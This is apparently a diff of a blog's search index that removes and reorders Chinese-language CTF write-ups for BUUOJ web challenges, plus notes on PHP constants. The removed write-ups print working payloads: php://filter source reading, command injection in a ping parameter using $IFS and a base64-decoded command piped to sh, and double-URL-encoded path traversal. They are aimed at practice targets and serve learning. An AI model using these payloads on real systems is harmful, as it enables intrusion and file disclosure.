-    <content><![CDATA[<p><a href="%5Bhttps://buuoj.cn/challenges">buuoj</a></p>
-<a id="more"></a>
-
-
-
-<h2 id="Index-php"><a href="#Index-php" class="headerlink" title="Index.php"></a>Index.php</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;meta charset&#x3D;&quot;utf8&quot;&gt;</span><br><span class="line">&lt;a href&#x3D;&quot;?file&#x3D;flag.php&quot;&gt;tips&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>
-
-<p>结合题目名可以猜测是一个文件包含</p>
-<p>使用<code>php伪协议</code>读一下源码</p>
-<p><code>?file=php://filter/read=convert.base64-encode/resource=index.php</code></p>
-<p>解码之后是</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;meta charset&#x3D;&quot;utf8&quot;&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$file &#x3D; $_GET[&quot;file&quot;];</span><br><span class="line">if(stristr($file,&quot;php:&#x2F;&#x2F;input&quot;) || stristr($file,&quot;zip:&#x2F;&#x2F;&quot;) || stristr($file,&quot;phar:&#x2F;&#x2F;&quot;) || stristr($file,&quot;data:&quot;))&#123;</span><br><span class="line">	exit(&#39;hacker!&#39;);</span><br><span class="line">&#125;</span><br><span class="line">if($file)&#123;</span><br><span class="line">	include($file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">	echo &#39;&lt;a href&#x3D;&quot;?file&#x3D;flag.php&quot;&gt;tips&lt;&#x2F;a&gt;&#39;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="flag-php"><a href="#flag-php" class="headerlink" title="flag.php"></a>flag.php</h2><p>通过这个文件包含读一下<code>flag.php</code>的源码</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &quot;Can you find out the flag?&quot;;</span><br><span class="line">&#x2F;&#x2F;flag&#123;bfb0b1cd-426b-4590-9b3d-059c3b3cec96&#125;</span><br></pre></td></tr></table></figure>
-
-<p>得到了flag</p>
-]]></content>
-      <categories>
-        <category>web</category>
-        <category>buu</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>buu</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>GXYCTF2019_Ping Ping Ping</title>
-    <url>//buu_GXYCTF2019_Ping_Ping_Ping.html</url>
-    <content><![CDATA[<p><a href="%5Bhttps://buuoj.cn/challenges">buuoj</a></p>
-<a id="more"></a>
-
-
-
-<h2 id="index-php"><a href="#index-php" class="headerlink" title="index.php"></a>index.php</h2><img src="[GXYCTF2019]Ping Ping Ping/image-20200809214947203.png" alt="image-20200809214947203" style="zoom:50%;" />
-
-<p>给了一个参数是<code>ip</code>，猜测也是命令执行</p>
-<p>使用<code>?ip=l;ls</code></p>
-<img src="[GXYCTF2019]Ping Ping Ping/image-20200809215038502.png" alt="image-20200809215038502" style="zoom:50%;" />
-
-<p>尝试<code>cat flag.php</code></p>
-<img src="[GXYCTF2019]Ping Ping Ping/image-20200809215106353.png" alt="image-20200809215106353" style="zoom:50%;" />
-
-<p>过滤了空格</p>
-<h2 id="绕过空格"><a href="#绕过空格" class="headerlink" title="绕过空格"></a>绕过空格</h2><p>查找资料用于绕过空格</p>
-<p><a href="https://www.freebuf.com/articles/web/137923.html">CTF中绕过小技巧</a></p>
-<p>经过测试发现<code>$IFS$9</code>可以绕过</p>
-<img src="[GXYCTF2019]Ping Ping Ping/image-20200809215218599.png" alt="image-20200809215218599" style="zoom:50%;" />
-
-<p>继续读<code>flag.php</code></p>
-<img src="[GXYCTF2019]Ping Ping Ping/image-20200809215246648.png" alt="image-20200809215246648" style="zoom:50%;" />
-
-<p><code>flag</code>也被过滤了</p>
-<p>看一下<code>index.php</code>的代码</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    ....</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/ /&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">    	<span class="keyword">die</span>(<span class="string">&quot;fxck your space!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/bash/&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">    	<span class="keyword">die</span>(<span class="string">&quot;fxck your bash!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/.*f.*l.*a.*g.*/&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">    	<span class="keyword">die</span>(<span class="string">&quot;fxck your flag!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable">$a</span> = shell_exec(<span class="string">&quot;ping -c 4 &quot;</span>.<span class="variable">$ip</span>);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;</span></span><br><span class="line"><span class="string">&quot;</span>;</span><br><span class="line">  print_r(<span class="variable">$a</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="绕过flag"><a href="#绕过flag" class="headerlink" title="绕过flag"></a>绕过flag</h2><p>这里屏蔽了很多语法，但是没有屏蔽<code>base64</code>和<code>sh</code></p>
-<p>使用<code>base64 -d</code>可以达到相同的作用</p>
-<p><code>payload</code>如下</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?ip&#x3D;l;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</span><br></pre></td></tr></table></figure>
-
-<p>执行之后在注释里面看到<code>flag</code></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;?ip&#x3D;</span><br><span class="line">&lt;pre&gt;PING l (127.0.0.1): 56 data bytes</span><br><span class="line">&lt;?php</span><br><span class="line">$flag &#x3D; &quot;flag&#123;3158ae61-1e44-495d-9f83-f63a7c25fd14&#125;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>web</category>
-        <category>buu</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>buu</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>HCTF_2018_WarmUp</title>
-    <url>//buu_HCTF2018_WarmUp.html</url>
-    <content><![CDATA[<p><a href="%5Bhttps://buuoj.cn/challenges">buuoj</a></p>
-<a id="more"></a>
-
-
-
-<h2 id="Index-php"><a href="#Index-php" class="headerlink" title="Index.php"></a>Index.php</h2><p>访问之后是一个滑稽的表情，查看网页源代码提示有一个<code>source.php</code></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang&#x3D;&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1.0&quot;&gt;</span><br><span class="line">    &lt;meta http-equiv&#x3D;&quot;X-UA-Compatible&quot; content&#x3D;&quot;ie&#x3D;edge&quot;&gt;</span><br><span class="line">    &lt;title&gt;Document&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;!--source.php--&gt;</span><br><span class="line">    </span><br><span class="line">    &lt;br&gt;&lt;img src&#x3D;&quot;https:&#x2F;&#x2F;i.loli.net&#x2F;2018&#x2F;11&#x2F;01&#x2F;5bdb0d93dc794.jpg&quot; &#x2F;&gt;&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<h2 id="source-php"><a href="#source-php" class="headerlink" title="source.php"></a>source.php</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    class emmm</span><br><span class="line">    &#123;</span><br><span class="line">        public static function checkFile(&amp;$page)</span><br><span class="line">        &#123;</span><br><span class="line">            $whitelist &#x3D; [&quot;source&quot;&#x3D;&gt;&quot;source.php&quot;,&quot;hint&quot;&#x3D;&gt;&quot;hint.php&quot;];</span><br><span class="line">            if (! isset($page) || !is_string($page)) &#123;</span><br><span class="line">                echo &quot;you can&#39;t see it&quot;;</span><br><span class="line">                return false;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            if (in_array($page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page &#x3D; mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos($page . &#39;?&#39;, &#39;?&#39;)</span><br><span class="line">            );</span><br><span class="line">            if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page &#x3D; urldecode($page);</span><br><span class="line">            $_page &#x3D; mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)</span><br><span class="line">            );</span><br><span class="line">            if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">            echo &quot;you can&#39;t see it&quot;;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (! empty($_REQUEST[&#39;file&#39;])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[&#39;file&#39;])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[&#39;file&#39;])</span><br><span class="line">    ) &#123;</span><br><span class="line">        include $_REQUEST[&#39;file&#39;];</span><br><span class="line">        exit;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;&lt;br&gt;&lt;img src&#x3D;\&quot;https:&#x2F;&#x2F;i.loli.net&#x2F;2018&#x2F;11&#x2F;01&#x2F;5bdb0d93dc794.jpg\&quot; &#x2F;&gt;&quot;;</span><br><span class="line">    &#125;  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>要想达到文件包含</p>
-<ul>
-<li>变量<code>$file</code>不为空</li>
-<li><code>$file</code>要是一个字符串</li>
-<li>能够通过<code>emmm::checkfile</code></li>
-</ul>
-<h3 id="emmm-checkfile"><a href="#emmm-checkfile" class="headerlink" title="emmm:checkfile"></a>emmm:checkfile</h3><p>想要<code>return true</code>就要满足以下条件</p>
-<ul>
-<li><code>$file</code>不为空</li>
-<li><code>$file</code>在两个<code>?</code>字符之间的部分需要在<code>whitelist</code>里面</li>
-</ul>
-<h2 id="hint-php"><a href="#hint-php" class="headerlink" title="hint.php"></a>hint.php</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">flag not here, and flag in ffffllllaaaagggg</span><br></pre></td></tr></table></figure>
-
-<p>告诉了<code>flag</code>存放的位置</p>
-<h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>对<code>?</code>字符进行两次<code>urlencode</code>就可以绕过<code>emmm:checkfile</code>。</p>
-<p>在发送数据到服务器的时候会有一次<code>urldecode</code>，然后在<code>emmm:checkfile</code>中有第二次过滤</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;6cba0961-d475-45e3-b0ea-9040e2e31cf5.node3.buuoj.cn&#x2F;source.php?file&#x3D;source.php%253f..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg</span><br></pre></td></tr></table></figure>
-
-<p>访问上述url时，服务器将第一次<code>urldecode</code>，结果如下</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;6cba0961-d475-45e3-b0ea-9040e2e31cf5.node3.buuoj.cn&#x2F;source.php?file&#x3D;source.php%3f..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg</span><br></pre></td></tr></table></figure>
-
-<p>在执行<code>source.php</code>的过程中，第二次解码之后的数据为</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">source.php?..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg</span><br></pre></td></tr></table></figure>
-
-<p>取到<code>?</code>即<code>source.php</code>通过白名单验证</p>
-<p>至于上面的好多<code>../</code>是由于不知道<code>flag</code>文件的目录，所以只能穷举父级目录<code>../</code></p>
-]]></content>
-      <categories>
-        <category>web</category>
-        <category>buu</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>buu</tag>
       </tags>
   </entry>
   <entry>
@@ -3077,50 +3139,6 @@
       </tags>
   </entry>
   <entry>
-    <title>php伪协议</title>
-    <url>//php_agreement.html</url>
-    <content><![CDATA[<p>（还没有开始写）</p>
-<p>参考资料: <a href="https://segmentfault.com/a/1190000018991087">php伪协议总结</a></p>
-<a id="more"></a>
-
-]]></content>
-      <categories>
-        <category>web</category>
-        <category>php</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>php</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>php中的系统常量</title>
-    <url>//php_systemVar.html</url>
-    <content><![CDATA[<p>php中的常量</p>
-<p>参见<a href="https://www.php.net/manual/zh/reserved.variables.php">php手册</a></p>
-<a id="more"></a>
-
-
-
-<h3 id="系统常量"><a href="#系统常量" class="headerlink" title="系统常量"></a>系统常量</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">PHP_VERSION:		<span class="comment">// php的版本号</span></span><br><span class="line">PHP_INT_SIZE:		<span class="comment">// 整型的大小</span></span><br><span class="line">PHP_INT_MAX:		<span class="comment">// 整型能表示的最大值</span></span><br><span class="line">PHP_OS 				<span class="comment">// 当前PHP环境的运行操作系统</span></span><br><span class="line">M_PI 				<span class="comment">// 圆周率常量值</span></span><br><span class="line">M_E 				<span class="comment">// 科学常数e</span></span><br><span class="line">E_ERROR 			<span class="comment">// 最近的错误之处</span></span><br><span class="line">E_WARNING 			<span class="comment">// 最近的警告之处</span></span><br><span class="line">E_PARSE 			<span class="comment">// 剖析语法有潜在问题之处</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="魔术常量"><a href="#魔术常量" class="headerlink" title="魔术常量"></a>魔术常量</h3><p>魔术常量是会根据环境的变化而发生变化的变量</p>
-<p>由<code>__xxx__</code>形式构成</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">__FILE__</span> 		<span class="comment">// 当前PHP文件的绝对路径路径(会带上文件名)</span></span><br><span class="line"><span class="keyword">__DIR__</span>			<span class="comment">// 当前文件的目录(绝对路径)</span></span><br><span class="line"><span class="keyword">__LINE__</span> 		<span class="comment">// 当前PHP文件中所在的行号</span></span><br><span class="line"><span class="keyword">__FUNCTION__</span> 	<span class="comment">// 当前函数名，只对函数内调用起作用</span></span><br><span class="line"><span class="keyword">__CLASS__</span> 		<span class="comment">// 当前类名，只对类起作用</span></span><br><span class="line"><span class="keyword">__NAMESPACE__</span>	<span class="comment">// 当前所属的命名空间</span></span><br><span class="line"><span class="keyword">__METHOD__</span> 		<span class="comment">// 表示类方法名，比如B::test</span></span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>web</category>
-        <category>php</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>php</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>php中的文件包含</title>
     <url>//php_fileinclude.html</url>
     <content><![CDATA[<p>php文件包含</p>
@@ -3183,6 +3201,50 @@
 <blockquote>
 <p>那么问题来了，如果构成了循环的嵌套包含会怎么样</p>
 </blockquote>
+]]></content>
+      <categories>
+        <category>web</category>
+        <category>php</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>php</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>php伪协议</title>
+    <url>//php_agreement.html</url>
+    <content><![CDATA[<p>（还没有开始写）</p>
+<p>参考资料: <a href="https://segmentfault.com/a/1190000018991087">php伪协议总结</a></p>
+<a id="more"></a>
+
+]]></content>
+      <categories>
+        <category>web</category>
+        <category>php</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>php</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>php中的系统常量</title>
+    <url>//php_systemVar.html</url>
+    <content><![CDATA[<p>php中的常量</p>
+<p>参见<a href="https://www.php.net/manual/zh/reserved.variables.php">php手册</a></p>
+<a id="more"></a>
+
+
+
+<h3 id="系统常量"><a href="#系统常量" class="headerlink" title="系统常量"></a>系统常量</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">PHP_VERSION:		<span class="comment">// php的版本号</span></span><br><span class="line">PHP_INT_SIZE:		<span class="comment">// 整型的大小</span></span><br><span class="line">PHP_INT_MAX:		<span class="comment">// 整型能表示的最大值</span></span><br><span class="line">PHP_OS 				<span class="comment">// 当前PHP环境的运行操作系统</span></span><br><span class="line">M_PI 				<span class="comment">// 圆周率常量值</span></span><br><span class="line">M_E 				<span class="comment">// 科学常数e</span></span><br><span class="line">E_ERROR 			<span class="comment">// 最近的错误之处</span></span><br><span class="line">E_WARNING 			<span class="comment">// 最近的警告之处</span></span><br><span class="line">E_PARSE 			<span class="comment">// 剖析语法有潜在问题之处</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="魔术常量"><a href="#魔术常量" class="headerlink" title="魔术常量"></a>魔术常量</h3><p>魔术常量是会根据环境的变化而发生变化的变量</p>
+<p>由<code>__xxx__</code>形式构成</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">__FILE__</span> 		<span class="comment">// 当前PHP文件的绝对路径路径(会带上文件名)</span></span><br><span class="line"><span class="keyword">__DIR__</span>			<span class="comment">// 当前文件的目录(绝对路径)</span></span><br><span class="line"><span class="keyword">__LINE__</span> 		<span class="comment">// 当前PHP文件中所在的行号</span></span><br><span class="line"><span class="keyword">__FUNCTION__</span> 	<span class="comment">// 当前函数名，只对函数内调用起作用</span></span><br><span class="line"><span class="keyword">__CLASS__</span> 		<span class="comment">// 当前类名，只对类起作用</span></span><br><span class="line"><span class="keyword">__NAMESPACE__</span>	<span class="comment">// 当前所属的命名空间</span></span><br><span class="line"><span class="keyword">__METHOD__</span> 		<span class="comment">// 表示类方法名，比如B::test</span></span><br></pre></td></tr></table></figure>
+
 ]]></content>
       <categories>
         <category>web</category>
